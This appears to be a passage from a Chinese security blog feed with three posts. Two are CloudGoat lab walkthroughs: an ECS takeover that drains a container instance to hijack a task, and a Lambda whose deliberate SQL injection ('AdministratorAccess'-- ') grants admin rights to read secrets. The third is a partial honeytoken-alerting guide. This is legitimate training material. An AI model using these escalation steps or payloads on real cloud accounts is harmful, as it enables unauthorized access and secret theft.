+<pre><code class="language-json">aws --profile task-role ecs describe-clusters --clusters arn:aws:ecs:us-east-1:637423561540:cluster/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster
+</code></pre>
+<figure data-type="image" tabindex="9"><img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721047804876-a67bd3e2-4b21-4019-8136-4095ffebcfac.png" alt="image.png" loading="lazy"></figure>
+<p>列出集群里的 Container Instances</p>
+<pre><code class="language-json">aws --profile task-role ecs list-container-instances --cluster arn:aws:ecs:us-east-1:637423561540:cluster/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster
+{
+    &quot;containerInstanceArns&quot;: [
+        &quot;arn:aws:ecs:us-east-1:637423561540:container-instance/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster/363039e07fcf40db99d5a5c57558a50c&quot;,
+        &quot;arn:aws:ecs:us-east-1:637423561540:container-instance/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster/e5edf45c9c5a44f9a21ab32987022046&quot;
+    ]
+}
+</code></pre>
+<p>查看这两个 Container Instances 对应的实例ID</p>
+<pre><code class="language-json">aws --profile task-role ecs describe-container-instances --cluster arn:aws:ecs:us-east-1:637423561540:cluster/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster --container-instances arn:aws:ecs:us-east-1:637423561540:container-instance/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster/363039e07fcf40db99d5a5c57558a50c --query &quot;containerInstances[*].ec2InstanceId&quot;
+[
+    &quot;i-0118453e343e82efd&quot;
+]
+
+aws --profile task-role ecs describe-container-instances --cluster arn:aws:ecs:us-east-1:637423561540:cluster/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster --container-instances arn:aws:ecs:us-east-1:637423561540:container-instance/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster/e5edf45c9c5a44f9a21ab32987022046 --query &quot;containerInstances[*].ec2InstanceId&quot;
+[
+    &quot;i-0fe09f6db2ba10228&quot;
+]
+</code></pre>
+<p>从前面控制的实例元数据可知，这个实例对应的是第一个 Container Instances<br>
+<img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721048453179-cd9b2ad6-ff0d-4c13-8f1e-548c7ebc4c93.png" alt="image.png" loading="lazy"></p>
+<p>列出集群中的服务</p>
+<pre><code class="language-json">aws --profile task-role ecs list-services --cluster arn:aws:ecs:us-east-1:637423561540:cluster/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster
+{
+    &quot;serviceArns&quot;: [
+        &quot;arn:aws:ecs:us-east-1:637423561540:service/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster/vault&quot;,
+        &quot;arn:aws:ecs:us-east-1:637423561540:service/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster/vulnsite&quot;,
+        &quot;arn:aws:ecs:us-east-1:637423561540:service/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster/privd&quot;
+    ]
+}
+</code></pre>
+<p>该渗透场景的目标是<code>vault</code>服务，所以我们查看该服务详细的信息。从输出的结果中可以看到：</p>
+<ul>
+<li><code>desiredCount</code>: 服务期望运行的任务数量为 1。</li>
+<li><code>runningCount</code>: 当前正在运行的任务数量也为 1。</li>
+<li><code>pendingCount</code>: 等待启动的任务数量为 0，表明没有任务在排队等待启动。</li>
+</ul>
+<pre><code class="language-json">aws --profile task-role ecs describe-services --cluster arn:aws:ecs:us-east-1:637423561540:cluster/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster --services arn:aws:ecs:us-east-1:637423561540:service/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster/vault
+</code></pre>
+<figure data-type="image" tabindex="10"><img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721048642479-bc0f3458-6881-49b3-83a7-c98ea656db1e.png" alt="image.png" loading="lazy"></figure>
+<p>再来看下该服务运行在哪个 Container Instances 上。首先，查看服务中的任务：</p>
+<pre><code class="language-json">aws --profile task-role ecs list-tasks --cluster arn:aws:ecs:us-east-1:637423561540:cluster/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster --service-name vault
+{
+    &quot;taskArns&quot;: [
+        &quot;arn:aws:ecs:us-east-1:637423561540:task/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster/e00e1be22a134245893031ee753ff53f&quot;
+    ]
+}
+</code></pre>
+<p>然后，描述这些任务以获取它们运行在哪个 Container Instance 上的信息。显示的是第二个我们控制外的 EC2</p>
+<pre><code class="language-json">aws --profile task-role ecs describe-tasks --cluster arn:aws:ecs:us-east-1:637423561540:cluster/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster --tasks arn:aws:ecs:us-east-1:637423561540:task/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster/e00e1be22a134245893031ee753ff53f --query &quot;tasks[*].containerInstanceArn&quot;
+[
+    &quot;arn:aws:ecs:us-east-1:637423561540:container-instance/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster/e5edf45c9c5a44f9a21ab32987022046&quot;
+]
+</code></pre>
+<p>为了将<code>vault</code>移到受控主机上，我们可以将<code>vault</code>所在的 Container Instance 状态更新为 <code>DRAINING</code>，这样 ECS 就会自动将这个服务调度要我们这台主机上。而这个操作对应的权限<code>ecs:UpdateContainerInstancesState</code>刚好在 Container Instance Role 上。</p>
+<p>重新获取 Container Instance Role 的凭证登录<br>
+<img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721050303259-4cef4d7c-c197-4581-a230-dad911c1eba0.png" alt="image.png" loading="lazy"></p>
+<p>修改实例状态</p>
+<pre><code class="language-json">aws --profile ci-role ecs update-container-instances-state --cluster arn:aws:ecs:us-east-1:637423561540:cluster/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster --container-instances  arn:aws:ecs:us-east-1:637423561540:container-instance/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster/e5edf45c9c5a44f9a21ab32987022046 --status DRAINING
+</code></pre>
+<p>很快 task 被调度到了我们的受控主机上 <img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721050515762-3736636e-4a31-4741-9719-9e0086c30229.png" alt="image.png" loading="lazy"></p>
+<p>读取Flag</p>
+<pre><code class="language-json">docker exec abe084998eb7 cat FLAG.TXT
+</code></pre>
+<figure data-type="image" tabindex="11"><img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721050582298-b153b39c-d474-4503-a0c1-77cc0b235746.png" alt="image.png" loading="lazy"></figure>
+<h1 id="命令总结">命令总结</h1>
+<pre><code class="language-json">aws ecs describe-clusters --clusters [Cluster-ARN]
+aws ecs list-container-instances --cluster [Cluster-Name]
+aws ecs describe-container-instances --cluster [Cluster-Name] --container-instances [Container-Instance-ARNs]
+aws ecs list-services --cluster [Cluster-Name]
+aws ecs describe-services --cluster [Cluster-Name] --services [Service-ARNs]
+aws ecs list-tasks --cluster [Cluster-Name] --service-name [Service-Name]
+aws ecs describe-tasks --cluster [Cluster-Name] --tasks [Task-ARNs]
+aws ecs describe-container-instances --cluster [Cluster-Name] --container-instances [Container-Instance-ARNs]
+
+aws ecs update-container-instances-state --cluster &lt;your_cluster_name&gt; --container-instances &lt;target_container_instance&gt; --status DRAINING
+</code></pre>
+<h1 id="参考链接">参考链接</h1>
+<p><a href="https://www.ruse.tech/blogs/ecs-attack-methods">https://www.ruse.tech/blogs/ecs-attack-methods</a><br>
+<a href="https://docs.aws.amazon.com/zh_cn/AmazonECS/latest/developerguide/Welcome.html">https://docs.aws.amazon.com/zh_cn/AmazonECS/latest/developerguide/Welcome.html</a><br>
+<a href="https://www.bilibili.com/video/BV12E421K7ST/">https://www.bilibili.com/video/BV12E421K7ST/</a><br>
+<a href="https://www.youtube.com/watch?v=22IsSW3YD0A">https://www.youtube.com/watch?v=22IsSW3YD0A</a></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[CloudGoat (☁️🐐)靶场初体验]]></title>
+        <id>https://skyblu3519.github.io/post/cloudgoat-ba-chang-chu-ti-yan/</id>
+        <link href="https://skyblu3519.github.io/post/cloudgoat-ba-chang-chu-ti-yan/">
+        </link>
+        <updated>2024-07-09T15:58:22.000Z</updated>
+        <content type="html"><![CDATA[<p>一个开源的云靶场：<a href="https://github.com/RhinoSecurityLabs/cloudgoat/">https://github.com/RhinoSecurityLabs/cloudgoat/</a></p>
+<p>体验顺便学习一下📖</p>
+<h1 id="安装-配置">安装 &amp; 配置</h1>
+<p>安装前确保机器：</p>
+<ul>
+<li>Linux or MacOS. Windows is not officially supported.
+<ul>
+<li>Argument tab-completion requires bash 4.2+ (Linux, or OSX with some difficulty).</li>
+</ul>
+</li>
+<li>Python3.6+ is required.</li>
+<li>Terraform &gt;= 0.14 installed and in your $PATH.</li>
+<li>The AWS CLI installed and in your $PATH, and an AWS account with sufficient privileges to create and destroy resources.</li>
+<li>jq</li>
+</ul>
+<p>安装流程</p>
+<pre><code>git clone https://github.com/RhinoSecurityLabs/cloudgoat.git
+cd cloudgoat
+python3 -m venv .venv
+source .venv/bin/activate
+pip3 install -r ./requirements.txt
+chmod +x cloudgoat.py
+</code></pre>
+<p>然后是两步初始化</p>
+<pre><code>./cloudgoat.py config profile
+./cloudgoat.py config whitelist --auto
+</code></pre>
+<p>cloudgoat会使用本机上 AWS CLI 的配置。编辑配置文件<code>~/.aws/credentials</code>，添加cloudgoat所用的AWS账户的文件段<code>[skyblu3]</code><br>
+<img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720531972702-e43360e6-83e6-4a6b-b4a6-0b14500a8344.png" alt="image.png" loading="lazy"></p>
+<p><code>./cloudgoat.py config profile</code>输入<br>
+<img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720532044190-560aac93-f9fe-46db-8329-92fd9f87c691.png" alt="image.png" loading="lazy"></p>
+<p>第二步是配置云上可以部署的IP列表，云上没什么东西的话就直接<code>--auto</code>自动生成</p>
+<h1 id="靶场初体验">靶场初体验</h1>
+<h2 id="靶场搭建">靶场搭建</h2>
+<p>cloudgoat中有17个靶场，在Github页面的<strong>Scenarios Available</strong>部分可以导航到每个靶场的详情页面。点击第一个<code>vulnerable_lambda</code>靶场。<br>
+<img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720532249577-646b0f77-425c-4142-a050-a0029ba124e0.png" alt="image.png" loading="lazy"></p>
+<p>靶场的文档中包含启动的命令、资源列表和攻击路径，在旁边的目录列表也可以看到生成该靶场的tf代码<br>
+<img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720532539521-b22352e2-075b-41bc-b628-66c20f5f2102.png" alt="image.png" loading="lazy"></p>
+<p>接下来启动这个靶场</p>
+<pre><code>./cloudgoat.py create vulnerable_lambda
+</code></pre>
+<p>生成成功后拿到这个靶场的初始访问用户<br>
+<img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720532685265-09d28116-ed86-4da8-9bd7-759704ae4806.png" alt="image.png" loading="lazy"></p>
+<p>现在就可以开始渗透了</p>
+<h2 id="渗透开始">渗透开始</h2>
+<p>首先看下这个靶场的总结</p>
+<blockquote>
+<p>在此场景中，您以“bilbo”用户身份开始。您将扮演一个具有更多权限的角色，发现一个将策略应用于用户的 lambda 函数，并利用该函数中的漏洞来提升 bilbo 用户的权限以搜索秘密。</p>
+</blockquote>
+<p>用提供的凭证登录bilbo用户<br>
+<img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720532908694-31fd1c96-9a36-4d2e-8bc3-118c27abdbd7.png" alt="image.png" loading="lazy"></p>
+<p>策略挖掘，可以看到用户的内联策略</p>
+<pre><code class="language-json">aws iam list-user-policies --user-name cg-bilbo-vulnerable_lambda_cgidi6d2661463
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720533601842-06de227d-bf47-4655-bf41-b335f6cea1c1.png" alt="image.png" loading="lazy"></figure>
+<p>查看策略具体内容</p>
+<pre><code class="language-json">aws iam get-user-policy --user-name cg-bilbo-vulnerable_lambda_cgidi6d2661463 --policy-name cg-bilbo-vulnerable_lambda_cgidi6d2661463-standard-user-assumer
+{
+    &quot;UserName&quot;: &quot;cg-bilbo-vulnerable_lambda_cgidi6d2661463&quot;,
+    &quot;PolicyName&quot;: &quot;cg-bilbo-vulnerable_lambda_cgidi6d2661463-standard-user-assumer&quot;,
+    &quot;PolicyDocument&quot;: {
+        &quot;Version&quot;: &quot;2012-10-17&quot;,
+        &quot;Statement&quot;: [
+            {
+                &quot;Action&quot;: &quot;sts:AssumeRole&quot;,
+                &quot;Effect&quot;: &quot;Allow&quot;,
+                &quot;Resource&quot;: &quot;arn:aws:iam::940877411605:role/cg-lambda-invoker*&quot;,
+                &quot;Sid&quot;: &quot;&quot;
+            },
+            {
+                &quot;Action&quot;: [
+                    &quot;iam:Get*&quot;,
+                    &quot;iam:List*&quot;,
+                    &quot;iam:SimulateCustomPolicy&quot;,
+                    &quot;iam:SimulatePrincipalPolicy&quot;
+                ],
+                &quot;Effect&quot;: &quot;Allow&quot;,
+                &quot;Resource&quot;: &quot;*&quot;,
+                &quot;Sid&quot;: &quot;&quot;
+            }
+        ]
+    }
+}
+
+</code></pre>
+<p>可以看到该用户对IAM下的所有资源都有List/Get权限！同时他还可以扮演一个<code>cg-lambda-invoker</code>角色。列出所有IAM角色</p>
+<pre><code class="language-json">aws iam list-roles --query &quot;Roles[*].RoleName&quot;
+[
+    &quot;AWSServiceRoleForRDS&quot;,
+    &quot;AWSServiceRoleForResourceExplorer&quot;,
+    &quot;AWSServiceRoleForSupport&quot;,
+    &quot;AWSServiceRoleForTrustedAdvisor&quot;,
+    &quot;cg-lambda-invoker-vulnerable_lambda_cgidi6d2661463&quot;,
+    &quot;vulnerable_lambda_cgidi6d2661463-policy_applier_lambda1&quot;
+]
+</code></pre>
+<p><code>cg-lambda-invoker-vulnerable_lambda_cgidi6d2661463</code>应该就是下一步要扮演的角色了。不过在assume之前，先看下该角色的策略。另外我对<code>vulnerable_lambda_cgidi6d2661463-policy_applier_lambda1</code>这个角色也挺感兴趣的（毕竟我们有iam:List*/iam:Get*）。</p>
+<p>首先看下<code>vulnerable_lambda_cgidi6d2661463-policy_applier_lambda1</code>，这似乎是cloudgoat用来给靶场中的用户赋权的，同时它还有一个推送日志的权限，似乎是给CloudTrail使用的。</p>
+<pre><code class="language-json">aws iam list-role-policies --role-name vulnerable_lambda_cgidi6d2661463-policy_applier_lambda1
+aws iam get-role-policy --role-name vulnerable_lambda_cgidi6d2661463-policy_applier_lambda1 --policy-name policy_applier_lambda1
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720535122702-94b7bdfc-2239-4a6a-af81-9877a879e37b.png" alt="image.png" loading="lazy"></figure>
+<p>然后是<code>cg-lambda-invoker-vulnerable_lambda_cgidi6d2661463</code>，它包含对一个Lambda的大部分操作</p>
+<pre><code class="language-json">aws iam list-role-policies --role-name cg-lambda-invoker-vulnerable_lambda_cgidi6d2661463
+aws iam get-role-policy --role-name cg-lambda-invoker-vulnerable_lambda_cgidi6d2661463 --policy-name lambda-invoker
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720535862712-fbdcfc6b-3041-4cbb-8ae2-44836e3869f4.png" alt="image.png" loading="lazy"></figure>
+<p>现在Assume这个Role</p>
+<pre><code class="language-json">aws sts assume-role --role-arn arn:aws:iam::637423561540:role/cg-lambda-invoker-vulnerable_lambda_cgidi6d2661463 --role-session-name lambda_invoker
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720536339676-894b1f20-1618-4bbc-9efe-104fe9c89140.png" alt="image.png" loading="lazy"></figure>
+<p>查看function的信息，在<code>Code.Location</code>位置找到函数源码的下载链接</p>
+<pre><code class="language-json">aws lambda get-function --function-name vulnerable_lambda_cgidi6d2661463-policy_applier_lambda1
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720537386567-091a4ddc-6240-4d72-845f-5c0616875403.png" alt="image.png" loading="lazy"></figure>
+<p>解压源码zip<br>
+<img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720537490379-c0cde3bb-f491-4cb1-a2d5-424a8cdca522.png" alt="image.png" loading="lazy"></p>
+<p>打开main.py</p>
+<pre><code class="language-python">import boto3
+from sqlite_utils import Database
+
+db = Database(&quot;my_database.db&quot;)
+iam_client = boto3.client('iam')
+
+
+# db[&quot;policies&quot;].insert_all([
+#     {&quot;policy_name&quot;: &quot;AmazonSNSReadOnlyAccess&quot;, &quot;public&quot;: 'True'}, 
+#     {&quot;policy_name&quot;: &quot;AmazonRDSReadOnlyAccess&quot;, &quot;public&quot;: 'True'},
+#     {&quot;policy_name&quot;: &quot;AWSLambda_ReadOnlyAccess&quot;, &quot;public&quot;: 'True'},
+#     {&quot;policy_name&quot;: &quot;AmazonS3ReadOnlyAccess&quot;, &quot;public&quot;: 'True'},
+#     {&quot;policy_name&quot;: &quot;AmazonGlacierReadOnlyAccess&quot;, &quot;public&quot;: 'True'},
+#     {&quot;policy_name&quot;: &quot;AmazonRoute53DomainsReadOnlyAccess&quot;, &quot;public&quot;: 'True'},
+#     {&quot;policy_name&quot;: &quot;AdministratorAccess&quot;, &quot;public&quot;: 'False'}
+# ])
+
+
+def handler(event, context):
+    target_policys = event['policy_names']
+    user_name = event['user_name']
+    print(f&quot;target policys are : {target_policys}&quot;)
+
+    for policy in target_policys:
+        statement_returns_valid_policy = False
+        statement = f&quot;select policy_name from policies where policy_name='{policy}' and public='True'&quot;
+        for row in db.query(statement):
+            statement_returns_valid_policy = True
+            print(f&quot;applying {row['policy_name']} to {user_name}&quot;)
+            response = iam_client.attach_user_policy(
+                UserName=user_name,
+                PolicyArn=f&quot;arn:aws:iam::aws:policy/{row['policy_name']}&quot;
+            )
+            print(&quot;result: &quot; + str(response['ResponseMetadata']['HTTPStatusCode']))
+
+        if not statement_returns_valid_policy:
+            invalid_policy_statement = f&quot;{policy} is not an approved policy, please only choose from approved &quot; \
+                                       f&quot;policies and don't cheat. :) &quot;
+            print(invalid_policy_statement)
+            return invalid_policy_statement
+
+    return &quot;All managed policies were applied as expected.&quot;
+
+
+if __name__ == &quot;__main__&quot;:
+    payload = {
+        &quot;policy_names&quot;: [
+            &quot;AmazonSNSReadOnlyAccess&quot;,
+            &quot;AWSLambda_ReadOnlyAccess&quot;
+        ],
+        &quot;user_name&quot;: &quot;cg-bilbo-user&quot;
+    }
+    print(handler(payload, 'uselessinfo'))
+</code></pre>
+<p>这个函数可以给一个IAM用户赋权，可用的权限就是<code>my_database.db</code>中<code>public</code>值为True的几个</p>
+<pre><code class="language-python">AmazonSNSReadOnlyAccess
+AmazonRDSReadOnlyAccess
+AWSLambda_ReadOnlyAccess
+AmazonS3ReadOnlyAccess
+AmazonGlacierReadOnlyAccess
+AmazonRoute53DomainsReadOnlyAccess
+</code></pre>
+<p>但是用于判断权限是否符合要求的SQL语句<code>statement</code>没有对输入进行检查，而后面用来赋权的<code>attach_user_policy</code>函数用的确实查询出来的<code>row['policy_name']</code>。那我们可以输入<code>AdministratorAccess'-- </code>（使用sqlite的注释）进行注入，给用户赋予一个AWS托管权限<code>arn:aws:iam::aws:policy/AdministratorAccess</code>。这个权限是AWS的最高权限，可以对云上的所有资源进行访问。</p>
+<pre><code class="language-python">statement = f&quot;select policy_name from policies where policy_name='{policy}' and public='True'&quot;
+</code></pre>
+<figure data-type="image" tabindex="6"><img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720538139669-6c39b270-7c23-4811-a2d2-267749d63b7b.png" alt="image.png" loading="lazy"></figure>
+<p>编写payload.json</p>
+<pre><code class="language-json">{
+    &quot;policy_names&quot;: [
+        &quot;AdministratorAccess'-- &quot;
+    ],
+    &quot;user_name&quot;: &quot;cg-bilbo-vulnerable_lambda_cgidi6d2661463&quot;
+}
+</code></pre>
+<p>调用函数权限已被设置</p>
+<pre><code>aws lambda invoke --function-name vulnerable_lambda_cgidi6d2661463-policy_applier_lambda1 --payload file://payload.json output &amp;&amp; cat output
+</code></pre>
+<figure data-type="image" tabindex="7"><img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720539024560-d4e1f5fd-4f80-4479-a373-308f844c8c8f.png" alt="image.png" loading="lazy"></figure>
+<p>切换回原来的用户，<code>aws configure set aws_session_token &quot;&quot;</code>清空session token。查看用户的托管策略，AdministratorAccess已被成功赋予</p>
+<pre><code class="language-json">aws iam list-attached-user-policies --user-name cg-bilbo-vulnerable_lambda_cgidi6d2661463
+</code></pre>
+<figure data-type="image" tabindex="8"><img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720539655707-f3c0841b-8fec-4171-b979-b5168a8aa0d6.png" alt="image.png" loading="lazy"></figure>
+<p>现在我们已经可以访问云上的所有资源了！列出secret</p>
+<pre><code class="language-json">aws secretsmanager list-secrets --query 'SecretList[*].[Name, Description, ARN]' --output json
+</code></pre>
+<figure data-type="image" tabindex="9"><img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720539817522-083c2421-a5df-444c-8bf3-ec4df24d80db.png" alt="image.png" loading="lazy"></figure>
+<p>读取flag</p>
+<pre><code class="language-json">aws secretsmanager get-secret-value --secret-id vulnerable_lambda_cgidi6d2661463-final_flag  
+</code></pre>
+<figure data-type="image" tabindex="10"><img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720539914753-30611895-5b0e-4bbb-9c6d-318a7dae21f1.png" alt="image.png" loading="lazy"></figure>
+<h2 id="攻击路径">攻击路径</h2>
+<p>再看下靶场给的攻击路径，和我们的流程几乎一样。还是挺简单的。<br>
+<img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720540014904-a6bb6af5-fc6d-4230-b1b3-2997a19b9d90.png" alt="image.png" loading="lazy"></p>
+<h1 id="解语">解语</h1>
+<p>最后简单浏览下它的tf目录结构，这里云上每个类型的资源都用了单独的文件写。其他的就是一些必要数据源和变量输入输出。<br>
+<img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720540350475-60b6dca5-dc7b-4369-a622-222542387101.png" alt="image.png" loading="lazy"></p>
+<p>实验结束，输入<code>./cloudgoat.py destroy vulnerable_lambda</code>清空资源以免产生额外的计费<br>
+<img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720540459689-ef7190f7-edd2-4029-b07c-1bf3ee270b71.png" alt="image.png" loading="lazy"></p>
+<p>画饼：学习这个项目的代码流程，重点是tf代码的编写</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[在AWS上使用诱饵用户捕获攻击者]]></title>
+        <id>https://skyblu3519.github.io/post/zai-aws-shang-shi-yong-you-er-yong-hu-bu-huo-gong-ji-zhe/</id>
+        <link href="https://skyblu3519.github.io/post/zai-aws-shang-shi-yong-you-er-yong-hu-bu-huo-gong-ji-zhe/">
+        </link>
+        <updated>2024-07-09T08:57:26.000Z</updated>
+        <content type="html"><![CDATA[<p>思路就是创建一个IAM用户，然后用CloudWatch监控该用户的行为，如果出现了该用户的操作则触发告警，并通过邮件通知。</p>
+<p>使用控制台和Terraform两种方法实现</p>
+<h1 id="控制台创建">控制台创建</h1>
+<h2 id="创建诱饵用户">创建诱饵用户</h2>
+<p>在 IAM 控制台创建一个诱饵用户<strong>honeyUser</strong>，不附加任何权限<br>
+<img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720081492814-3e17265e-d254-41d0-a77f-54f84a647378.png" alt="image.png" loading="lazy"></p>
+<p>为<strong>honeyUser</strong>创建一个访问密钥，这对密钥之后便可以通过一些方法泄露出去，进而捕获可疑的攻击者。<br>
+<img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720081561008-5584f5f6-0d2b-4c9a-bd73-152c263e3b6f.png" alt="image.png" loading="lazy"></p>
+<h2 id="创建cloudtrail并将事件发送至cloudwatch">创建CloudTrail并将事件发送至CloudWatch</h2>
+<p>进入<strong>CloudTrail</strong>控制台创建一个<strong>trail</strong>（追踪），创建<strong>CloudTrail</strong>的时候需要选择一个S3来对日志进行存储，如果没有提前准备好则需要在这里新创建一个。<br>
+<img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720084252797-7f09bc55-a982-41a0-9746-ff4f8c8ec10d.png" alt="image.png" loading="lazy"></p>
+<p>这里不使用加密方便后面数据的检索<br>
+<img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720082522978-0a4e8c78-584b-4455-98fc-ec6c2003573a.png" alt="image.png" loading="lazy"></p>
+<p>配置向<strong>CloudWatch Logs</strong>发送事件，之后可以在<strong>CloudWatch</strong>配置规则来对诱饵用户的登录行为进行告警。<strong>CloudTrail</strong> 使用 <strong>CloudWatch</strong> 日志组作为日志事件的传输终端节点，需要创建一个日志组或者指定一个现有日志组。同时需要一个 <strong>IAM角色</strong> 将事件发送到 <strong>CloudWatch</strong>，这个角色需要有<code>logs:CreateLogStream</code>和<code>logs:PutLogEvents</code>两个权限。这里让它新建一个日志组和角色。<br>
+<img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720084273034-2b8cd697-2d68-495d-ba1c-a8bcd7dcb5af.png" alt="image.png" loading="lazy"></p>
+<p>在下一步追踪的事件中只选择<code>Management events</code>，主要追踪用户的登录行为<br>
+<img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720084370949-747883e2-fbf3-4d51-8c18-87918a5c3598.png" alt="image.png" loading="lazy"></p>
+<p>创建好后在 <strong>Trails页面</strong> 显示该<strong>Trail</strong> 已开始工作（Status: Logging）<br>
+<img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720084619035-22a6424b-f1f5-4b15-804a-61c3979a9af5.png" alt="image.png" loading="lazy"></p>
+<p>在配置CloudWatch之前，我们先看下和这个 <strong>Trail</strong> 以前创建的都有那些资源。进入 <strong>IAM页面</strong> 在 <strong>策略</strong> 中查看客户托管策略，我们可以看到一个新创建的用来推送 <strong>CloudWatch</strong> 的托管策略。它的描述是：<code>Policy for config CloudWathLogs for trail cloudtrail-logging-honey, created by CloudTrail console</code><br>
+<img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720085238845-d879e93c-d500-4412-ba75-86bd168cb67f.png" alt="image.png" loading="lazy"></p>
+<p>点击查看它的策略内容。这里许可了两个操作。而他们指向的资源都是 <strong>CloudTrail</strong> 向 <strong>CloudWatch Logs</strong> 发送的这条日志流</p>
+<ul>
+<li><strong>logs:CreateLogStream</strong>: 允许被授权的实体创建日志流</li>
+<li><strong>logs:PutLogEvents</strong>: 允许被授权的实体向日志流中写入日志事件。</li>
+</ul>
+<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720085429872-efdcb37a-c5ee-47a1-bf84-198a5d29223b.png" alt="image.png" loading="lazy"></figure>
+<p>进入 <strong>角色</strong> 可以看到 <strong>CloudTrail</strong> 创建的角色 <strong>CloudTrailRoleForCloudWatch-Honey</strong><br>
+<img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720085905922-883fb904-4fb3-4133-a75e-6717bb9b532e.png" alt="image.png" loading="lazy"></p>
+<p>同时它的可信实体指向了指定了 AWS 的 <strong>CloudTrail</strong> 服务 (<code>cloudtrail.amazonaws.com</code>)<br>
+<img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720085957456-cda42843-1058-4c6f-ba5c-817bcfe1e64d.png" alt="image.png" loading="lazy"></p>
+<p>权限则使用的是刚刚看到的策略组<br>
+<img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720086049997-9f862dee-a967-469f-907a-144a23e66156.png" alt="image.png" loading="lazy"></p>
+<p>在 <strong>CloudWatch</strong> 中的日志组中，看到 <strong>CloudTrail</strong> 创建的日志组 <strong>aws-cloudtrail-logs-CloudWatch-Honey</strong><br>
+<img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720086403608-a041b1a3-ebc2-45dd-8536-22dfea5688b6.png" alt="image.png" loading="lazy"></p>
+<p>现在我们在 AWS CLI 中登录之前创建的 honeyUser<br>
+<img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720086607466-7a19947d-5b95-4b59-8aae-7861465d0ec7.png" alt="image.png" loading="lazy"></p>
+<p>回到 <strong>CloudWatch</strong> 页面，进入 <strong>Live Tail</strong>，选择要筛选的日志组<br>
+<img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720086831606-9ac3c56c-3ed9-4d48-96b0-f3acd179c106.png" alt="image.png" loading="lazy"></p>
+<p>过了一会儿后看到我们的登录记录<br>
+<img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720087141533-20e9d7f3-de6e-45f6-9be0-ae6b61026900.png" alt="image.png" loading="lazy"></p>
+<h2 id="创建日志筛选并设置告警">创建日志筛选并设置告警</h2>
+<p>选择日志组，操作 -&gt; 创建指标筛选条件<br>
+<img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720094509300-2e7a594c-1a84-4b45-89c7-fe425c745d46.png" alt="image.png" loading="lazy"></p>
+<p>使用筛选模板筛选出 honeyUser 的所有日志</p>
+<pre><code>{ $.userIdentity.type = &quot;IAMUser&quot; &amp;&amp; $.userIdentity.userName = &quot;honeyUser&quot; }
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720095262029-8f4aae34-b4a7-40f4-b9f0-f006151ab3ee.png" alt="image.png" loading="lazy"></figure>
+<p>在分配指标页面输入筛选名称、命名空间、指标名称、指标值设置为1<br>
+<img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720095864584-4b6fc5d6-84d6-4b8c-8093-15d94b8c01e4.png" alt="image.png" loading="lazy"></p>
+<p>配置好之后为它创建告警<br>
